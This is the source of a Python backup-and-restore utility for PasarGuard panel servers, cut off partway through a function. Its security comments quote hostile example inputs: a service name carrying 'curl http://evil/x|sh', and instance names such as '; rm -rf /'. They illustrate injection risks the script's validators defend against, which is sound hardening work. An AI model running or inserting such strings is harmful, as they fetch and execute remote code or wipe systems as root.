#!/usr/bin/env python3
# ============================================================
#   Pasarguard Backup Utility  v4.2.8
#   Dev by: CIA 
#   GitHub: https://github.com/CIAUB
#   v4.2.8 — PostgreSQL/TimescaleDB credential parity pass:
#          * _backup_postgres_local now resolves creds via
#            _resolve_pg_credentials() (.env, then docker-compose.yml
#            fallback) and passes PGPASSWORD into pg_dumpall/pg_dump,
#            matching what restore already did — previously backup used
#            only backend["user"] with no password at all, so any install
#            enforcing Postgres password auth, or with POSTGRES_USER/
#            POSTGRES_PASSWORD only in docker-compose.yml, could fail or
#            silently mis-detect the user even though restore of that
#            same install worked fine.
#          * _list_databases_local/_ssh and _pg_db_timescale_info also
#            forward PGPASSWORD now, so database enumeration and
#            TimescaleDB-extension detection don't silently fall back to
#            the legacy single-database guess on password-enforcing
#            installs.
#          * _resolve_pg_credentials() now tries the actually-detected
#            compose service name first before falling back to a fixed
#            guess-list (postgres/timescaledb/db/database) — installs
#            where the Postgres/TimescaleDB service has a different name
#            in docker-compose.yml previously had their compose-fallback
#            silently miss the credentials sitting right there.
#   v4.0 — multi-database support: backs up & restores EVERY Pasarguard DB
#          (not just the legacy "pasarguard" database).
#   v4.1 — full compatibility with the official PasarGuard panel
#          (https://github.com/PasarGuard/panel): detects and handles all
#          five supported backends — sqlite, postgresql, timescaledb, mysql,
#          mariadb — including single-file sqlite backups, mysqldump for
#          MySQL/MariaDB, and per-database pg_dump for PostgreSQL/TimescaleDB.
#   v4.2 — security & bugfix pass:
#          * fixed shell command injection in Manual Restore (zip filename
#            was interpolated unquoted into a shell=True command)
#          * fixed MySQL/MariaDB backup & restore: MYSQL_PWD is now passed
#            into the container via `docker compose exec -e`, not set on the
#            host process (which docker compose does not forward)
#          * bot token / chat id no longer passed as plaintext CLI args
#            (leaked via `ps`/`/proc/<pid>/cmdline` and world-readable
#            systemd unit files) — now written to a 0600 credentials file
#          * passwords are now read with getpass (no terminal echo)
#          * backup archives are chmod 600 on disk (they contain .env
#            secrets)
#          * SSH host-key auto-accept now prints an explicit warning
#          * Telegram Bot API's 50 MB per-file limit is fully handled:
#            oversized backups are transparently split into numbered
#            .001/.002/... chunks on send, and on the restore side
#            (Manual Restore) the chunks are auto-detected, verified for
#            completeness, and rejoined into the original archive before
#            extraction — no manual `cat` needed.
#          * "Manage Backup Schedulers" can now restart an instance so it
#            picks up the latest script code without deleting and
#            recreating it, and can update a running scheduler's bot
#            token / admin chat ID in place.
#   v4.2.4 — 'manifest.tsv not found or empty' fail-fast pass:
#          * new archive backup with no usable manifest.tsv is now caught
#            LOCALLY right after it's created — in both Auto Transfer and
#            Manual Restore — before any destination/local containers are
#            stopped or directories wiped. Previously this failure was only
#            discovered after a full upload + destination wipe + container
#            restart, leaving the destination stopped with nothing to
#            restore.
#          * _read_manifest_remote now retries the remote file check once
#            after a short delay instead of failing on the first miss.
#          * when the manifest genuinely is missing on the remote,
#            diagnostics now include a `find -maxdepth 2` of the whole
#            Pasarguard directory, not just the (possibly nonexistent)
#            db_dump/ subfolder — so it's clear whether extraction landed
#            somewhere unexpected or didn't happen at all.
#   v4.2.1 — security hardening pass:
#          * `/tmp` backup staging dir replaced with tempfile.mkdtemp
#            (0700) so the unencrypted .env + DB dump isn't world-readable
#            mid-backup
#          * `curl | sudo bash` auto-update replaced with a
#            download-to-temp / verify-sha256 / then-exec flow (a
#            compromised raw.githubusercontent.com payload no longer
#            gets piped straight into a root shell on confirm)
#          * strict instance-name validator ([A-Za-z0-9_-]+) used by every
#            function that builds a filesystem path, systemd unit name,
#            screen/tmux session name, or shell=True command from user
#            input — closes the path-traversal in /etc/pasarguard-backup
#            that v4.2 introduced, plus the unit/session name injection
#            in `Manage Backup Schedulers`. shlex.quote() added to the
#            same shell=True spots as defence-in-depth
#          * SQLite restore target is now realpath-checked against
#            /var/lib/pasarguard/ so a malicious backup's
#            SQLALCHEMY_DATABASE_URL can't redirect cp to /etc/cron.d etc.
#          * manifest.sql_file is rejected if it contains `..`, `/`, or
#            `\` (path-traversal in restore)
# ============================================================

import os, sys, subprocess, datetime, shutil, re, tempfile, hashlib, zipfile
import time, urllib.request, urllib.error, uuid, threading, itertools
import argparse, shlex, socket, getpass, json, stat

# ── ANSI Colors ──────────────────────────────────────────────
# Three red tones for hierarchy:
#   R1  bright red  — active labels, prompts, highlights
#   R2  mid red     — secondary info, borders, dividers
#   R3  dark red    — dim text, decorations
#   WH  white       — message body text (keeps readability)
#   BLD bold
#   DIM dim
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    R1    = "\033[38;2;255;80;80m"    # bright red  — titles, selections
    R2    = "\033[38;2;200;50;50m"    # mid red     — labels, borders
    R3    = "\033[38;2;120;20;20m"    # dark red    — dim / decorative
    WH    = "\033[97m"                # white       — readable body text

def clr():
    os.system("clear")

def tw():
    try: return os.get_terminal_size().columns
    except: return 80

def hline(ch="─"):
    return C.R3 + ch * tw() + C.RESET

def center(s, raw_len=None):
    l = raw_len if raw_len is not None else len(s)
    pad = max(0, (tw() - l) // 2)
    return " " * pad + s

# ── Status helpers ───────────────────────────────────────────
def ok(msg):   print(f"  {C.R1}+{C.RESET}  {C.WH}{msg}{C.RESET}")
def err(msg):  print(f"  {C.R1}x{C.RESET}  {C.WH}{msg}{C.RESET}")
def info(msg): print(f"  {C.R2}>{C.RESET}  {C.WH}{msg}{C.RESET}")
def warn(msg): print(f"  {C.R1}!{C.RESET}  {C.WH}{msg}{C.RESET}")

def print_success(msg): print(f"  {C.R1}[OK]{C.RESET}   {C.WH}{msg}{C.RESET}")
def print_error(msg):   print(f"  {C.R1}[ERR]{C.RESET}  {C.WH}{msg}{C.RESET}")
def print_info(msg):    print(f"  {C.R2}[..]{C.RESET}   {C.WH}{msg}{C.RESET}")
def print_warning(msg): print(f"  {C.R1}[!!]{C.RESET}   {C.WH}{msg}{C.RESET}")

def pause_and_return():
    input(f"\n  {C.R2}Press ENTER to return to the main menu...{C.RESET}")

# ── Spinner ──────────────────────────────────────────────────
class Spinner:
    def __init__(self, message="Processing..."):
        self.cycle  = itertools.cycle(['-', '\\', '|', '/'])
        self.stop   = threading.Event()
        self.msg    = message
        self.thread = threading.Thread(target=self._spin)

    def _spin(self):
        while not self.stop.is_set():
            sys.stdout.write(f"\r  {C.R2}{next(self.cycle)}{C.RESET}  {C.WH}{self.msg}{C.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * (len(self.msg) + 15) + '\r')
        sys.stdout.flush()

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *_):
        self.stop.set()
        self.thread.join()

# ── Auto-install paramiko ────────────────────────────────────
# Skip this when running as the headless daemon child (spawned by screen /
# tmux / systemd) so the persistence layer doesn't repeat the apt/pip dance.
if "--daemon-backup" not in sys.argv:
    try:
        import paramiko
    except ImportError:
        print(f"  {C.R2}[..]{C.RESET}  {C.WH}Required libraries not found. Installing...{C.RESET}")
        with Spinner("Installing Paramiko... Please wait"):
            try:
                subprocess.check_call(["apt-get", "update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.check_call(["apt-get", "install", "-y", "python3-paramiko", "python3-pip", "unzip"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "--quiet"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import paramiko
        print(f"  {C.R1}[OK]{C.RESET}  {C.WH}Libraries installed successfully!{C.RESET}\n")

# ── Auto-install PySocks (needed for SOCKS4/5 proxy support) ──
# Unlike paramiko, this one is NOT skipped for the daemon child, since the
# scheduled backup loop itself may need to reach Telegram through a SOCKS proxy.
try:
    import socks as _pysocks
except ImportError:
    if "--daemon-backup" not in sys.argv:
        print(f"  {C.R2}[..]{C.RESET}  {C.WH}Installing PySocks (SOCKS proxy support)...{C.RESET}")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pysocks", "--quiet"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    try:
        import socks as _pysocks
    except ImportError:
        _pysocks = None

# ── Paths ────────────────────────────────────────────────────
PASARGUARD_DIR      = "/opt/pasarguard"
PG_NODE_DIR         = "/opt/pg-node"
PASARGUARD_DATA_DIR = "/var/lib/pasarguard"
PG_NODE_DATA_DIR    = "/var/lib/pg-node"

COMPOSE_DOWN_TIMEOUT    = 30
POSTGRES_READY_MAX_WAIT = 120
POSTGRES_READY_INTERVAL = 2
COMPOSE_UP_MAX_WAIT     = 120
COMPOSE_UP_INTERVAL     = 3
COMPOSE_STOP_RETRIES    = 3

SCREEN_SESSION_BASE    = "pasarguard_backup"
TMUX_SESSION_BASE      = "pasarguard_backup"
SYSTEMD_SERVICE_BASE   = "pasarguard-backup"
SYSTEMD_UNIT_DIR       = "/etc/systemd/system"

# v4.2 — credentials directory for scheduler daemons. Files here hold the
# bot token / chat id / proxy for a given scheduler instance instead of
# passing them as CLI arguments (which leak via `ps`, /proc/<pid>/cmdline,
# and world-readable systemd unit files). Each file is chmod 600.
CREDS_DIR = "/etc/pasarguard-backup"

# v4.2.1 — strict validator for instance/file names that get embedded into
# filesystem paths, systemd unit names, screen/tmux session names, or
# shell=True commands. Anything outside [A-Za-z0-9_-]+ is rejected. Defence
# in depth — the user (running as root) is already trusted, but a single
# `../` or `; rm -rf /` slipping through here becomes a path-traversal
# RCE elsewhere. The two existing places this used to land unsafely are
# _creds_path() (writes/reads /etc/pasarguard-backup/<name>.json) and
# ask_instance_name() (returns the suffix used in unit/session names).
_INSTANCE_NAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")

def _validate_instance_name(name, *, allow_empty=False):
    if not name:
        if allow_empty:
            return ""
        raise ValueError("empty name")
    if not _INSTANCE_NAME_RE.match(name):
        raise ValueError(
            f"invalid name {name!r} — only letters, digits, '_' and '-' are allowed"
        )
    return name

def _creds_path(instance):
    safe = instance or "default"
    # v4.2.1 — refuse anything that could escape CREDS_DIR before we
    # touch the filesystem. _validate_instance_name raises ValueError on
    # a bad name; callers (write_daemon_creds / read_daemon_creds /
    # read_daemon_meta / run_daemon_from_args) propagate that.
    _validate_instance_name(safe)
    return os.path.join(CREDS_DIR, f"{safe}.json")

# v4.2.1 — validator for docker compose service names. `svc` is extracted
# from docker-compose.yml / `docker compose config` output and then
# interpolated (without quoting, until this fix) into shell=True commands
# like `docker compose exec -T {shlex.quote(svc)} ...`. A malicious or tampered compose
# file with a service named, say, `timescaledb; curl http://evil/x|sh`,
# would then inject arbitrary commands as root. Defence in depth: the
# service name is validated at extraction AND shlex.quote() is applied at
# every shell-use site below.
_SAFE_SERVICE_NAME_RE = re.compile(r"^[A-Za-z0-9_.-]+$")

def _validate_service_name(svc, *, allow_empty=False):
    if not svc:
        if allow_empty:
            return ""
        raise ValueError("empty service name")
    if not _SAFE_SERVICE_NAME_RE.match(svc):
        raise ValueError(
            f"unsafe docker service name {svc!r} — only letters, digits, '_', '.', '-' are allowed"
        )
    return svc

def write_daemon_creds(instance, bot_token, admin_id, proxy=None, interval_h=None, include_node=None):
    """Persist everything a scheduler instance needs to run: token, chat id,
    proxy, interval, and scope. Storing interval/include_node here (not just
    token/chat) means 'Manage Backup Schedulers' can fully reconstruct the
    daemon command later — to restart a screen/tmux session with the exact
    same settings, or to push an updated token/chat id — without asking the
    user to re-enter everything from scratch. Merges with any existing file
    so partial updates (e.g. token-only) don't wipe out other fields."""
    os.makedirs(CREDS_DIR, exist_ok=True)
    try:
        os.chmod(CREDS_DIR, 0o700)
    except Exception:
        pass
    path = _creds_path(instance)
    existing = {}
    if os.path.exists(path):
        try:
            with open(path) as f:
                existing = json.load(f)
        except Exception:
            existing = {}
    data = {
        "token":    bot_token if bot_token is not None else existing.get("token", ""),
        "chat":     admin_id if admin_id is not None else existing.get("chat", ""),
        "proxy":    (proxy if proxy is not None else existing.get("proxy", "")) or "",
        "interval": interval_h if interval_h is not None else existing.get("interval", 1.0),
        "node":     include_node if include_node is not None else existing.get("node", False),
    }
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        json.dump(data, f)
    os.chmod(path, 0o600)
    return path

def read_daemon_creds(instance):
    path = _creds_path(instance)
    with open(path) as f:
        data = json.load(f)
    return data.get("token", ""), data.get("chat", ""), (data.get("proxy") or None)

def read_daemon_meta(instance):
    """Full stored config for a scheduler instance (token/chat/proxy/interval/
    node), or None if no credentials file exists for it. Used by 'Manage
    Backup Schedulers' to rebuild the exact daemon command for a restart."""
    path = _creds_path(instance)
    if not os.path.exists(path):
        return None
    try:
        with open(path) as f:
            data = json.load(f)
    except Exception:
        return None
    return {
        "token":    data.get("token", ""),
        "chat":     data.get("chat", ""),
        "proxy":    data.get("proxy") or None,
        "interval": data.get("interval", 1.0),
        "node":     bool(data.get("node", False)),
    }

def _migrate_legacy_systemd_instance(name):
    """One-time upgrade path for a systemd scheduler that was created by a
    pre-v4.2 version of this script, where --token/--chat/--interval/--node
    were baked in plaintext inside ExecStart= (world-readable, and visible
    in `ps`). Reads the old unit file, pulls the values back out, writes
    them into the new 0600 credentials file, and rewrites ExecStart to the
    new token-free form — so 'Restart' / 'Update Bot Token' work on it going
    forward exactly like a scheduler created fresh in v4.2.

    Returns the migrated meta dict on success, or None if the unit file
    can't be found/parsed (e.g. it's already using the new format, or it's
    not a scheduler this script created)."""
    unit_path = f"{SYSTEMD_UNIT_DIR}/{name}.service"
    if not os.path.exists(unit_path):
        return None
    try:
        with open(unit_path) as f:
            unit_text = f.read()
    except Exception:
        return None

    exec_line = None
    for line in unit_text.splitlines():
        if line.strip().startswith("ExecStart="):
            exec_line = line.strip()[len("ExecStart="):]
            break
    if not exec_line:
        return None

    try:
        argv = shlex.split(exec_line)
    except ValueError:
        return None

    token = chat = proxy = None
    interval = 1.0
    include_node = False
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--token" and i + 1 < len(argv):
            token = argv[i + 1]; i += 2; continue
        if a == "--chat" and i + 1 < len(argv):
            chat = argv[i + 1]; i += 2; continue
        if a == "--proxy" and i + 1 < len(argv):
            proxy = argv[i + 1]; i += 2; continue
        if a == "--interval" and i + 1 < len(argv):
            try:
                interval = float(argv[i + 1])
            except ValueError:
                pass
            i += 2; continue
        if a == "--node":
            include_node = True; i += 1; continue
        i += 1

    if not token or not chat:
        # Nothing usable to migrate (already new-format, or a foreign unit).
        return None

    print_info(f"Migrating '{name}' from the old plaintext-credentials format to the secure 0600 store...")
    write_daemon_creds(name, token, chat, proxy, interval_h=interval, include_node=include_node)

    # Rewrite ExecStart to the new token-free invocation and lock the unit
    # file down, same as launch_via_systemd does for freshly created ones.
    new_daemon_cmd = build_daemon_command(interval, include_node, instance=name)
    new_unit_text = "\n".join(
        (f"ExecStart={new_daemon_cmd}" if line.strip().startswith("ExecStart=") else line)
        for line in unit_text.splitlines()
    ) + "\n"
    try:
        with open(unit_path, "w") as f:
            f.write(new_unit_text)
        os.chmod(unit_path, 0o600)
        run_command("systemctl daemon-reload", quiet=True)
    except Exception as e:
        print_warning(f"Credentials were migrated, but updating the unit file failed: {e}")
        print_warning("The old token may still be readable in the unit file — consider removing")
        print_warning("and recreating this scheduler instance instead.")

    print_success(f"'{name}' migrated — credentials are now stored in {_creds_path(name)} (mode 600).")
    return read_daemon_meta(name)

# Per-instance status files so the "Manage Backup Schedulers" menu can show
# whether an instance is currently backing up or sleeping until its next run,
# instead of just a raw process-alive check.
# v4.2.1 — state lives under the same /etc/pasarguard-backup tree (0700,
# root-owned) instead of /tmp. Even though state files don't carry secrets,
# a local attacker who could write to /tmp/<...>.state could trick the
# "Manage Backup Schedulers" menu into showing the wrong status.
STATE_DIR = os.path.join(CREDS_DIR, "state")
_STATE_DIR_READY = False

def _ensure_state_dir():
    global _STATE_DIR_READY
    if _STATE_DIR_READY:
        return True
    try:
        os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)
        # CREDS_DIR itself is also 0700 from write_daemon_creds, but
        # belt-and-braces in case the state dir was created before that.
        os.chmod(STATE_DIR, 0o700)
        _STATE_DIR_READY = True
        return True
    except Exception:
        return False

def _state_file(instance):
    return os.path.join(STATE_DIR, f"{instance}.state")

def write_state(instance, phase, extra=""):
    if not instance:
        return
    if not _ensure_state_dir():
        return
    try:
        path = _state_file(instance)
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w") as f:
            f.write(f"{phase}|{extra}|{time.time()}")
    except Exception:
        pass

def read_state(instance):
    """Returns (phase, extra, age_seconds) or None."""
    try:
        with open(_state_file(instance)) as f:
            phase, extra, ts = f.read().split("|", 2)
        return phase, extra, time.time() - float(ts)
    except Exception:
        return None

# ── Logo / Header ────────────────────────────────────────────
LOGO = [
    "██████╗  ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗██╗   ██╗██████╗ ",
    "██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║   ██║██╔══██╗",
    "██████╔╝██║  ███╗██████╔╝███████║██║     █████╔╝ ██║   ██║██████╔╝",
    "██╔═══╝ ██║   ██║██╔══██╗██╔══██║██║     ██╔═██╗ ██║   ██║██╔═══╝ ",
    "██║     ╚██████╔╝██████╔╝██║  ██║╚██████╗██║  ██╗╚██████╔╝██║     ",
    "╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ",
]
LOGO_W = 71

def print_header(title=""):
    clr()
    print()
    for line in LOGO:
        print(center(C.R1 + C.BOLD + line + C.RESET, LOGO_W))
    sub = C.R1 + C.BOLD + "B A C K U P   U T I L I T Y   v 4 . 2 . 8   -   C I A U B" + C.RESET
    print(center(sub, 57))
    print()
    print(hline())
    if title:
        print()
        print(center(C.R1 + C.BOLD + title + C.RESET, len(title)))
    print()

# ── Shell helpers ─────────────────────────────────────────────
def local_shell(command, cwd=None):
    try:
        r = subprocess.run(command, shell=True, cwd=cwd, capture_output=True, text=True)
        return r.returncode == 0, r.stdout.strip(), r.stderr.strip()
    except Exception as e:
        return False, "", str(e)

def run_command(cmd, output_file=None, cwd=None, quiet=True):
    try:
        if output_file:
            with open(output_file, "w") as f:
                subprocess.run(cmd, shell=True, check=True, stdout=f, stderr=subprocess.PIPE, cwd=cwd)
        else:
            stdout_t = subprocess.DEVNULL if quiet else None
            subprocess.run(cmd, shell=True, check=True, stdout=stdout_t, stderr=subprocess.PIPE, cwd=cwd)
        return True
    except subprocess.CalledProcessError as e:
        print_error(f"Command failed: {cmd}")
        if e.stderr:
            print_error(f"Details: {e.stderr.decode('utf-8').strip()}")
        return False

def ssh_shell(ssh, command):
    stdin, stdout, stderr = ssh.exec_command(command)
    exit_status = stdout.channel.recv_exit_status()
    return exit_status, stdout.read().decode().strip(), stderr.read().decode().strip()

def execute_ssh_command(ssh, command, description, required=True):
    print(f"  {C.R2}[SSH]{C.RESET}  {C.WH}{description}...{C.RESET}")
    exit_status, out, er = ssh_shell(ssh, command)
    if exit_status == 0:
        ok("Done.")
    else:
        err_msg = er or out
        print_error("Command failed!")
        if err_msg:
            print_error(f"Details: {err_msg}")
    return exit_status == 0 if required else True

# ── Persistence helpers (screen / tmux / systemd) ─────────────
def ensure_tool_installed(binary, pkg=None):
    """Make sure a local CLI tool (screen/tmux) is available, installing it via apt if missing."""
    pkg = pkg or binary
    if shutil.which(binary):
        return True
    print_info(f"'{binary}' not found. Installing '{pkg}'...")
    with Spinner(f"Installing {pkg}..."):
        run_command("apt-get update", quiet=True)
        run_command(f"apt-get install -y {pkg}", quiet=True)
    if shutil.which(binary):
        print_success(f"'{pkg}' installed.")
        return True
    print_error(f"Failed to install '{pkg}'. Please install it manually and try again.")
    return False

def build_daemon_command(interval_h, include_node, instance=None):
    """Builds the exact CLI invocation used to re-run this same script
    headlessly. v4.2: the bot token / chat id / proxy are NOT passed here
    any more — they're written to a 0600 credentials file (see
    write_daemon_creds) and the daemon reads them back by --instance name,
    so they never appear in `ps`, /proc/<pid>/cmdline, or a systemd unit
    file (which is world-readable by default)."""
    script_path = os.path.abspath(__file__)
    parts = [
        sys.executable, script_path, "--daemon-backup",
        "--interval", str(interval_h),
        "--instance", instance or "default",
    ]
    if include_node:
        parts.append("--node")
    return " ".join(shlex.quote(p) for p in parts)

def systemd_unit_name(suffix):
    return f"{SYSTEMD_SERVICE_BASE}-{suffix}"

def systemd_unit_path(suffix):
    return f"{SYSTEMD_UNIT_DIR}/{systemd_unit_name(suffix)}.service"

def list_systemd_backup_units():
    """Return [(suffix, unit_name, active_bool), ...] for every installed
    pasarguard-backup-* systemd service (so multiple schedulers can coexist)."""
    if shutil.which("systemctl") is None:
        return []
    ok_v, out, _ = local_shell(
        f"systemctl list-units --all --type=service --no-legend --plain '{SYSTEMD_SERVICE_BASE}-*.service' 2>/dev/null")
    units = []
    if ok_v and out:
        for line in out.splitlines():
            parts = line.split()
            if not parts:
                continue
            unit = parts[0]
            if not unit.endswith(".service"):
                continue
            name = unit[:-len(".service")]
            if not name.startswith(SYSTEMD_SERVICE_BASE + "-"):
                continue
            suffix = name[len(SYSTEMD_SERVICE_BASE) + 1:]
            # columns are: UNIT LOAD ACTIVE SUB DESCRIPTION...
            active = len(parts) > 3 and parts[2] == "active" and parts[3] in ("running", "start-pre", "start")
            units.append((suffix, name, active))
    return units

def list_screen_sessions():
    ok_v, out, _ = local_shell("screen -list 2>/dev/null")
    names = []
    if ok_v and out:
        import re
        for line in out.splitlines():
            m = re.search(r"\d+\.(" + re.escape(SCREEN_SESSION_BASE) + r"(?:-[^\s]+)?)", line)
            if m:
                names.append(m.group(1))
    return names

def list_tmux_sessions():
    ok_v, out, _ = local_shell("tmux list-sessions -F '#{session_name}' 2>/dev/null")
    names = []
    if ok_v and out:
        for line in out.splitlines():
            line = line.strip()
            if line.startswith(TMUX_SESSION_BASE):
                names.append(line)
    return names

def next_free_suffix(existing_names, base):
    """Given a list of full names like 'pasarguard-backup-2', find the
    lowest free numeric suffix (1, 2, 3, ...) not already taken."""
    taken = set()
    for n in existing_names:
        if n.startswith(base + "-"):
            taken.add(n[len(base) + 1:])
        elif n == base:
            taken.add("")
    i = 1
    while str(i) in taken:
        i += 1
    return str(i)

def ask_instance_name(kind):
    """Ask the user for a name/suffix for a new scheduler instance so several
    can run side by side (e.g. pasarguard-backup-1, pasarguard-backup-2)
    without clashing. Shows what already exists and lets the user rename
    to avoid collisions.

    v4.2.1 — the user-supplied suffix is strictly validated (only
    [A-Za-z0-9_-]+). Without this, a name such as `1; rm -rf /` would
    ride through into the systemd unit file, the screen/tmux session
    name, the credentials-file path, and every shell=True command below,
    becoming a one-line root RCE the moment the user creates a scheduler."""
    if kind == "systemd":
        base = SYSTEMD_SERVICE_BASE
        existing_full = [name for _, name, _ in list_systemd_backup_units()]
    elif kind == "screen":
        base = SCREEN_SESSION_BASE
        existing_full = list_screen_sessions()
    else:
        base = TMUX_SESSION_BASE
        existing_full = list_tmux_sessions()

    if existing_full:
        print_info(f"Existing {kind} schedulers: {', '.join(existing_full)}")

    suggested_suffix = next_free_suffix(existing_full, base)
    suggested_name    = f"{base}-{suggested_suffix}"

    print(f"  {C.R2}Give this scheduler instance a name so it can run alongside others.{C.RESET}")
    while True:
        name = input(f"  {C.R2}> Instance name [{suggested_name}]: {C.RESET}").strip()
        if not name:
            return suggested_name
        full_name = name if name.startswith(base) else f"{base}-{name}"
        # The base prefix is hard-coded (safe); validate only the
        # user-supplied suffix part. This catches shell metachars, `..`,
        # `/`, etc.
        if full_name.startswith(base + "-"):
            suffix = full_name[len(base) + 1:]
        else:
            suffix = full_name[len(base):]
        try:
            _validate_instance_name(suffix)
        except ValueError as e:
            print_error(f"{e} (in the part after '{base}-').")
            continue
        if full_name in existing_full:
            print_error(f"'{full_name}' is already in use — pick another name.")
            continue
        return full_name

def ask_persistence_mode():
    print()
    print(f"  {C.R2}How should the scheduler keep running after this SSH session closes?{C.RESET}")
    print()
    print(f"  {C.R1}1{C.RESET}  {C.R3}-{C.RESET}  {C.WH}None{C.RESET}      {C.R3}(runs in this terminal only; stops when SSH disconnects){C.RESET}")
    print(f"  {C.R1}2{C.RESET}  {C.R3}-{C.RESET}  {C.WH}screen{C.RESET}    {C.R3}(detached 'screen' session on the server){C.RESET}")
    print(f"  {C.R1}3{C.RESET}  {C.R3}-{C.RESET}  {C.WH}tmux{C.RESET}      {C.R3}(detached 'tmux' session on the server){C.RESET}")
    print(f"  {C.R1}4{C.RESET}  {C.R3}-{C.RESET}  {C.WH}systemd{C.RESET}   {C.R3}(background service; survives reboot too){C.RESET}")
    print()
    while True:
        choice = input(f"  {C.R2}> Enter 1, 2, 3 or 4: {C.RESET}").strip()
        if choice in ("1", "2", "3", "4"):
            return choice
        print_error("Invalid choice. Enter 1, 2, 3 or 4.")

def launch_via_screen(daemon_cmd, session_name=None):
    if not ensure_tool_installed("screen"):
        return False
    session_name = session_name or ask_instance_name("screen")
    # v4.2.1 — validate + shlex.quote before any shell=True use.
    _validate_instance_name(session_name)
    q = shlex.quote(session_name)
    exists, _, _ = local_shell(f"screen -list | grep -q '\\.{q}\\b'")
    if exists:
        print_warning(f"A screen session named '{session_name}' already exists.")
        kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
        if kill_it != "y":
            print_warning("Aborted — leaving the existing session untouched.")
            return False
        run_command(f"screen -S {q} -X quit", quiet=True)
    if not run_command(f"screen -dmS {q} {daemon_cmd}"):
        print_error("Failed to start the screen session.")
        return False
    print_success(f"Scheduler started in detached screen session '{session_name}'.")
    print_info(f"Reattach anytime with:  screen -r {session_name}")
    print_info(f"Stop it with:           screen -S {session_name} -X quit")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely.")
    return True

def launch_via_tmux(daemon_cmd, session_name=None):
    if not ensure_tool_installed("tmux"):
        return False
    session_name = session_name or ask_instance_name("tmux")
    # v4.2.1 — validate + shlex.quote before any shell=True use.
    _validate_instance_name(session_name)
    q = shlex.quote(session_name)
    exists, _, _ = local_shell(f"tmux has-session -t {q} 2>/dev/null")
    if exists:
        print_warning(f"A tmux session named '{session_name}' already exists.")
        kill_it = input(f"  {C.R2}> Kill it and start a fresh one? (y/n): {C.RESET}").strip().lower()
        if kill_it != "y":
            print_warning("Aborted — leaving the existing session untouched.")
            return False
        run_command(f"tmux kill-session -t {q}", quiet=True)
    if not run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
        print_error("Failed to start the tmux session.")
        return False
    print_success(f"Scheduler started in detached tmux session '{session_name}'.")
    print_info(f"Reattach anytime with:  tmux attach -t {session_name}")
    print_info(f"Stop it with:           tmux kill-session -t {session_name}")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely.")
    return True

def launch_via_systemd(daemon_cmd, unit_name=None):
    if shutil.which("systemctl") is None:
        print_error("systemctl not found — this server does not appear to use systemd.")
        return False
    if unit_name is None:
        unit_name = ask_instance_name("systemd")
    unit_path = f"{SYSTEMD_UNIT_DIR}/{unit_name}.service"
    unit = (
        "[Unit]\n"
        f"Description=PasarGuard Scheduled Backup ({unit_name})\n"
        "After=network-online.target docker.service\n"
        "Wants=network-online.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        f"ExecStart={daemon_cmd}\n"
        "Restart=always\n"
        "RestartSec=10\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )
    try:
        with open(unit_path, "w") as f:
            f.write(unit)
        # v4.2: unit files are world-readable by default (0644). The daemon
        # command no longer contains secrets (see build_daemon_command), but
        # keep the unit itself tight anyway.
        os.chmod(unit_path, 0o600)
    except Exception as e:
        print_error(f"Could not write unit file: {e}")
        return False

    print_info("Reloading systemd and enabling the service...")
    # v4.2.1 — quote unit_name in shell=True commands. unit_name was
    # already validated by ask_instance_name(), this is defence in depth.
    _validate_instance_name(unit_name)
    q = shlex.quote(unit_name)
    steps = [
        ("systemctl daemon-reload", "daemon-reload"),
        (f"systemctl enable {q}", "enable"),
        (f"systemctl restart {q}", "start"),
    ]
    for cmd, label in steps:
        if not run_command(cmd):
            print_error(f"systemctl {label} failed.")
            return False

    print_success(f"Scheduler installed as systemd service '{unit_name}'.")
    print_info(f"Check status with:  systemctl status {unit_name}")
    print_info(f"Live logs with:     journalctl -u {unit_name} -f")
    print_info(f"Stop it with:       systemctl stop {unit_name}")
    print_info("Tip: use menu option 'Manage Backup Schedulers' to stop/restart/remove it safely,")
    print_info("     and you can install another instance alongside this one (e.g. -2, -3, ...).")
    return True

# ── DB service auto-detection ──────────────────────────────────
# The DB container is not always named "timescaledb" across PasarGuard
# installs/forks — it can be postgres, postgresql, pgsql, db, etc.
# We detect it once (from docker-compose.yml) and cache it for the
# rest of the run instead of assuming a fixed name.
_DB_SERVICE_CACHE = {}

def _detect_db_service_local(d=None, backend_type=None):
    d = d or PASARGUARD_DIR
    if d in _DB_SERVICE_CACHE:
        return _DB_SERVICE_CACHE[d]
    ok_v, out, _ = local_shell("docker compose config --services", cwd=d)
    services = [l.strip() for l in out.splitlines() if l.strip()] if ok_v else []
    svc = _pick_db_service(services, backend_type=backend_type)
    _DB_SERVICE_CACHE[d] = svc
    return svc

def _detect_db_service_ssh(ssh, d=None, backend_type=None):
    d = d or PASARGUARD_DIR
    key = ("ssh", d)
    if key in _DB_SERVICE_CACHE:
        return _DB_SERVICE_CACHE[key]
    ec, out, _ = ssh_shell(ssh, f"cd {d} && docker compose config --services 2>/dev/null")
